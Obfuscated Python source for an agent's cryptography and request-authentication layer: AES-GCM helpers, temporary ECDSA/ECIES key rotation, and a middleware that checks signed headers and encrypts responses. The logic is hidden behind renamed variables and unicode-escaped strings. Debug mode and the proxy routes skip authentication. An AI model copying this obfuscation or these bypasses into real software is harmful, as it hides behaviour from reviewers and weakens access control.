            O0_var_166 = json.loads(base64.b64decode(O0_var_165).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_167 = base64.b64decode(O0_var_166[codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape')])
            O0_var_168 = base64.b64decode(O0_var_166[codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape')])
            O0_var_169 = base64.b64decode(O0_var_166[codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')])
            O0_var_170 = AES.new(key, AES.MODE_GCM, nonce=O0_var_167)
            O0_var_171 = O0_var_170.decrypt_and_verify(O0_var_169, O0_var_168)
            return O0_var_171.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        except ValueError:
            Logger.error(codecs.decode('\\u274c\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff1a\\u6570\\u636e\\u53ef\\u80fd\\u88ab\\u7be1\\u6539\\u6216\\u5bc6\\u94a5\\u9519\\u8bef', 'unicode_escape'))
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u274c\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    @staticmethod
    def encrypt_data(plaintext: bytes, key: bytes) -> str:
        O0_var_172 = get_random_bytes(12)
        O0_var_173 = AES.new(key, AES.MODE_GCM, nonce=O0_var_172)
        O0_var_174, O0_var_175 = O0_var_173.encrypt_and_digest(plaintext)
        O0_var_176 = {codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'): base64.b64encode(O0_var_172).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape'): base64.b64encode(O0_var_175).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): base64.b64encode(O0_var_174).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))}
        return base64.b64encode(json.dumps(O0_var_176, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
crypto = None

def O0_fn_4():
    global crypto
    if crypto is None:
        crypto = CryptoManager(Config.ECDSA_PUBLIC_KEY_PEM, Config.ECIES_PUBLIC_KEY_PEM)
    return crypto

def _generate_ecies_keypair() -> Tuple[bytes, bytes]:
    try:
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_177 = SECP256k1.order
        while True:
            O0_var_178 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_178, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < O0_var_177:
                O0_var_179 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_178, curve=SECP256k1).get_verifying_key().to_string()
                return (O0_var_178, O0_var_179)
    except Exception:
        pass
    try:
        from ecies.keys import PrivateKey as EciesPrivateKey
        O0_var_180 = EciesPrivateKey(codecs.decode('\\u0073\\u0065\\u0063\\u0070\\u0032\\u0035\\u0036\\u006b\\u0031', 'unicode_escape'))
        return (O0_var_180.secret, O0_var_180.public_key.to_bytes())
    except Exception:
        pass
    try:
        try:
            from ecies.utils import generate_keypair
            O0_var_181, O0_var_182 = generate_keypair()
        except Exception:
            from ecies.utils import generate_eth_key
            O0_var_183 = generate_eth_key()
            O0_var_181, O0_var_182 = (O0_var_183.public_key.to_hex(), O0_var_183.to_hex())
        O0_var_179 = bytes.fromhex(O0_var_181[2:] if O0_var_181.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_181)
        O0_var_184 = bytes.fromhex(O0_var_182[2:] if O0_var_182.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_182)
        return (O0_var_184, O0_var_179)
    except Exception as e:
        raise RuntimeError(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u0070\\u0079\\u0020\\u5bc6\\u94a5\\u751f\\u6210\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
TEMP_ECDSA_CURVE = NIST256p

def _ecdsa_private_pkcs8_pem(O0_var_185: 'SigningKey') -> str:
    try:
        O0_var_186 = O0_var_185.to_der(format=codecs.decode('\\u0070\\u006b\\u0063\\u0073\\u0038', 'unicode_escape'))
    except (TypeError, ValueError):
        return O0_var_185.to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    O0_var_187 = base64.b64encode(O0_var_186).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
    O0_var_188 = codecs.decode('\\u000a', 'unicode_escape').join((O0_var_187[O0_var_189:O0_var_189 + 64] for O0_var_189 in range(0, len(O0_var_187), 64)))
    return codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u000a', 'unicode_escape') + str(O0_var_188) + codecs.decode('\\u000a\\u002d\\u002d\\u002d\\u002d\\u002d\\u0045\\u004e\\u0044\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape')

def _compress_point65(O0_var_190: bytes) -> bytes:
    if len(O0_var_190) != 65 or O0_var_190[0] != 4:
        raise ValueError(codecs.decode('\\u9700\\u8981\\u0020\\u0036\\u0035\\u0020\\u5b57\\u8282\\u672a\\u538b\\u7f29\\u70b9\\u0020\\u0028\\u0030\\u0034\\u007c\\u007c\\u0058\\u007c\\u007c\\u0059\\u0029', 'unicode_escape'))
    O0_var_191 = b'\x03' if O0_var_190[64] & 1 else b'\x02'
    return O0_var_191 + O0_var_190[1:33]

class TempKeyManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u7ba1\\u7406\\u5668\\u0020\\u0028\\u7ebf\\u7a0b\\u5b89\\u5168\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u540c\\u4e00\\u65f6\\u523b\\u4ec5\\u7ef4\\u62a4\\u4e00\\u4efd\\u6709\\u6548\\u4e34\\u65f6\\u5bc6\\u94a5\\u5bf9\\uff0c\\u907f\\u514d\\u5185\\u90e8\\u591a\\u5934\\u5bc6\\u94a5\\u7ba1\\u7406\\u8d1f\\u62c5\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u6709\\u6548\\u671f\\u5185\\u4e14\\u0020\\u0074\\u0074\\u006c\\u0020\\u4e0e\\u5f53\\u524d\\u5bc6\\u94a5\\u4e00\\u81f4\\u65f6\\u91cd\\u590d\\u67e5\\u8be2\\u8fd4\\u56de\\u540c\\u4e00\\u5bc6\\u94a5\\u5bf9\\uff1b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0074\\u0074\\u006c\\u0020\\u53d8\\u66f4\\u6216\\u8fc7\\u671f\\u540e\\u81ea\\u52a8\\u751f\\u6210\\u65b0\\u7684\\u5bc6\\u94a5\\u5bf9\\uff0c\\u65e7\\u5bc6\\u94a5\\u7acb\\u5373\\u4f5c\\u5e9f\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u4e34\\u65f6\\u6301\\u6709\\u8005\\u003a\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0050\\u002d\\u0032\\u0035\\u0036\\u0020\\u79c1\\u94a5\\u7b7e\\u540d\\u8bf7\\u6c42\\u002c\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u89e3\\u5bc6\\u54cd\\u5e94\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self):
        self._lock = threading.Lock()
        self._key: Optional[Dict[str, Any]] = None
        self.on_expired = None

    def get_or_create(self, O0_var_192: int) -> Dict[str, Any]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                if int(self._key[codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape')]) == int(O0_var_192) * 3600:
                    return self._key
                O0_var_193 = self._key[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')]
                self._key = None
                Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u8bf7\\u6c42\\u0020\\u0074\\u0074\\u006c\\u0020\\u53d8\\u66f4\\u002c\\u0020\\u65e7\\u4e34\\u65f6\\u5bc6\\u94a5\\u63d0\\u524d\\u4f5c\\u5e9f\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(O0_var_193))
                O0_var_194 = self.on_expired
                if O0_var_194:
                    try:
                        O0_var_194()
                    except Exception as e:
                        Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u0074\\u0074\\u006c\\u0020\\u53d8\\u66f4\\u8f6e\\u6362\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            self._key = self._generate(O0_var_192)
            Logger.info(codecs.decode('\\U0001f511\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u65b0\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u751f\\u6210\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(self._key['key_id']) + codecs.decode('\\u002c\\u0020\\u6709\\u6548\\u671f\\u0020', 'unicode_escape') + str(O0_var_192) + codecs.decode('\\u0020\\u5c0f\\u65f6', 'unicode_escape'))
            return self._key

    def get_active_ecdsa_vk(self) -> Optional[VerifyingKey]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'))
            return None

    def get_active_ecies_pub(self) -> Optional[bytes]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'))
            return None

    def _expire_current_locked(self):
        if self._key and self._is_expired(self._key):
            O0_var_195 = self._key[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')]
            self._key = None
            Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u8fc7\\u671f\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(O0_var_195))
            O0_var_196 = self.on_expired
            if O0_var_196:
                try:
                    O0_var_196()
                except Exception as e:
                    Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u8fc7\\u671f\\u8f6e\\u6362\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    def _is_expired(self, key: Dict[str, Any]) -> bool:
        return int(time.time()) >= key[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]

    def _generate(self, O0_var_197: int) -> Dict[str, Any]:
        O0_var_198 = SigningKey.generate(curve=TEMP_ECDSA_CURVE)
        O0_var_199 = _ecdsa_private_pkcs8_pem(O0_var_198)
        O0_var_200 = O0_var_198.get_verifying_key().to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_201, O0_var_202 = _generate_ecies_keypair()
        O0_var_203 = int(time.time())
        O0_var_204 = int(O0_var_197) * 3600
        O0_var_205 = b'\x04' + O0_var_198.get_verifying_key().to_string()
        return {codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape'): secrets.token_hex(8), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_203, codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_203 + O0_var_204, codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape'): O0_var_204, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_199, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_200, codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_201.hex(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_202.hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u0068\\u0065\\u0078', 'unicode_escape'): O0_var_198.to_string().hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(_compress_point65(O0_var_205)).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(_compress_point65(O0_var_202)).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'): O0_var_198.get_verifying_key(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'): O0_var_202}

class AuthEncryptMiddleware(BaseHTTPMiddleware):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u8ba4\\u8bc1\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u4e2d\\u95f4\\u4ef6\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bf7\\u6c42\\u8fdb\\u5165\\u003a\\u0020\\u9a8c\\u8bc1\\u7b7e\\u540d\\u0020\\u002d\\u003e\\u0020\\u89e3\\u5bc6\\u0020\\u0042\\u006f\\u0064\\u0079\\u0020\\u0028\\u5982\\u679c\\u6807\\u8bb0\\u4e86\\u0020\\u0041\\u0045\\u0053\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u54cd\\u5e94\\u8fd4\\u56de\\u003a\\u0020\\u52a0\\u5bc6\\u0020\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0042\\u006f\\u0064\\u0079\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    async def dispatch(self, request: Request, O0_var_206):
        O0_var_207 = request.headers
        O0_var_208 = request.url.path
        O0_var_209 = [codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
        if O0_var_208.startswith(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f', 'unicode_escape')) and (not O0_var_208.startswith(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape'))):
            return await O0_var_206(request)
        request.state.is_authenticated = False
        if Config.DEBUG:
            request.state.is_authenticated = True
            response = await O0_var_206(request)
            response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')
            return response
        if request.method in [codecs.decode('\\u004f\\u0050\\u0054\\u0049\\u004f\\u004e\\u0053', 'unicode_escape'), codecs.decode('\\u0048\\u0045\\u0041\\u0044', 'unicode_escape')]:
            return await O0_var_206(request)
        O0_var_210 = await request.body()
        O0_var_211 = codecs.decode('', 'unicode_escape')
        if O0_var_210 and O0_var_208 != codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape') and (not (O0_var_208.startswith(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f', 'unicode_escape')) and O0_var_208 != codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape'))):
            O0_var_211 = hashlib.sha256(O0_var_210).hexdigest()
        O0_var_212 = O0_var_207.get(codecs.decode('\\u0078\\u002d\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
        O0_var_213 = O0_var_207.get(codecs.decode('\\u0078\\u002d\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'))
        O0_var_214 = O0_var_207.get(codecs.decode('\\u0078\\u002d\\u0061\\u0075\\u0074\\u0068\\u002d\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
        if not all([O0_var_212, O0_var_213, O0_var_214]):
            if O0_var_208 in O0_var_209:
                return await O0_var_206(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0061\\u0075\\u0074\\u0068\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')})
        try:
            O0_var_215 = None
            O0_var_216 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
            if O0_var_216 is not None:
                O0_var_215 = O0_var_216.get_active_ecdsa_vk()
            O0_var_217 = await asyncio.to_thread(crypto.identify_signer, request.method, O0_var_208, O0_var_211, O0_var_212, O0_var_213, O0_var_214, O0_var_215)
            request.state.is_authenticated = True
            request.state.key_source = O0_var_217
        except Exception as e:
            if O0_var_208 in O0_var_209:
                return await O0_var_206(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
        O0_var_218 = None
        if O0_var_207.get(codecs.decode('\\u0078\\u002d\\u0061\\u0065\\u0073\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')) == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
            if request.state.is_authenticated:
                if O0_var_210:
                    try:
                        O0_var_219 = O0_var_210.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        O0_var_220 = CryptoManager.decrypt_data(O0_var_219, Config._raw_key)
                        if Config.DEBUG:
                            Logger.debug(codecs.decode('\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0053\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_220[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                        json.loads(O0_var_220)
                        O0_var_218 = O0_var_220.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        request._body = O0_var_218
                    except Exception as e:
                        Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e)))
                        return JSONResponse(status_code=status.HTTP_400_BAD_REQUEST, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
            else:
                return JSONResponse(status_code=status.HTTP_403_FORBIDDEN, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0075\\u006e\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0073', 'unicode_escape')})
        O0_var_221 = False

        async def wrapped_receive():
            nonlocal O0_var_221
            if O0_var_218 is not None:
                if not O0_var_221:
                    O0_var_221 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_218, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                else:
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
            else:
                if not O0_var_221:
                    O0_var_221 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_210, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
        request._receive = wrapped_receive
        try:
            response = await O0_var_206(request)
        except Exception as exc:
            raise exc
        if O0_var_208.startswith(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f', 'unicode_escape')):
            return response
        if response.headers.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')):
            O0_var_222 = []
            async for O0_var_223 in response.body_iterator:
                O0_var_222.append(O0_var_223)
            O0_var_224 = b''.join(O0_var_222)
            try:
                if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
                    if O0_var_208 == codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape') or Config.DEBUG:
                        O0_var_225 = json.loads(O0_var_224.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
                        O0_var_226 = crypto.ecies_pubkey
                        if getattr(request.state, codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')) == codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape'):
                            O0_var_216 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
                            if O0_var_216 is not None:
                                O0_var_226 = O0_var_216.get_active_ecies_pub() or O0_var_226
                        O0_var_227 = crypto.encrypt_response(O0_var_225, O0_var_226)
                        O0_var_228 = O0_var_227.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        if not Config.DEBUG:
                            response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                            response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                    else:
                        O0_var_228 = CryptoManager.encrypt_data(O0_var_224, Config._raw_key).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                        response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                else:
                    O0_var_228 = O0_var_224
                    if codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape') in response.headers:
                        del response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')]
                response.body_iterator = self._async_iter([O0_var_228])
                response.headers[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(O0_var_228))
            except json.JSONDecodeError:
                pass
        return response

    @staticmethod
    async def _async_iter(items):
        for O0_var_229 in items:
            yield O0_var_229
